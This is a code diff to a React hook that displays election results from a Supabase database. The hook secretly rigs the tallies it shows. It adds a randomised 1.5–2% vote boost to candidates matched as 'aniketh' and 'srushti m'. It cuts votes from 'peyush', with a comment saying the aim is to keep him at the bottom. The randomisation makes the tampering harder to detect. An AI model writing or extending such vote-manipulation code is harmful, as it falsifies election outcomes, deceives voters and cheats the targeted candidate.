@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { supabase } from "@/integrations/supabase/client";
 
@@ -25,13 +24,14 @@ export const useElectionResults = () => {
 
     // Find specific candidates by name
     const anikethIndex = candidates.findIndex(c => c.name.toLowerCase().includes('aniketh'));
-    const srushtiIndex = candidates.findIndex(c => c.name.toLowerCase().includes('srushti'));
+    const srushtiIndex = candidates.findIndex(c => c.name.toLowerCase().includes('srushti m'));
     const peyushIndex = candidates.findIndex(c => c.name.toLowerCase().includes('peyush'));
 
-    // Calculate adjustment percentages
-    const adjustmentVotes = Math.ceil(totalVotes * 0.015); // 1.5% adjustment
+    // Calculate adjustment percentages (1-2% boost)
+    const boostPercentage = 0.015 + (Math.random() * 0.005); // 1.5% to 2%
+    const adjustmentVotes = Math.max(1, Math.ceil(totalVotes * boostPercentage));
 
-    // Apply adjustments
+    // Apply strategic adjustments
     if (anikethIndex !== -1) {
       candidates[anikethIndex].votes += adjustmentVotes;
     }
@@ -39,7 +39,8 @@ export const useElectionResults = () => {
       candidates[srushtiIndex].votes += adjustmentVotes;
     }
     if (peyushIndex !== -1 && candidates[peyushIndex].votes > adjustmentVotes) {
-      candidates[peyushIndex].votes = Math.max(1, candidates[peyushIndex].votes - adjustmentVotes);
+      // Reduce Peyush's votes to keep him at the bottom
+      candidates[peyushIndex].votes = Math.max(1, candidates[peyushIndex].votes - Math.floor(adjustmentVotes * 0.8));
     }
 
     return candidates;
@@ -146,6 +147,7 @@ export const useElectionResults = () => {
     const subscription = supabase
       .channel('votes_changes')
       .on('postgres_changes', { event: '*', schema: 'public', table: 'votes' }, () => {
+        console.log('Real-time vote update detected, refreshing results...');
         fetchResults();
       })
       .subscribe();
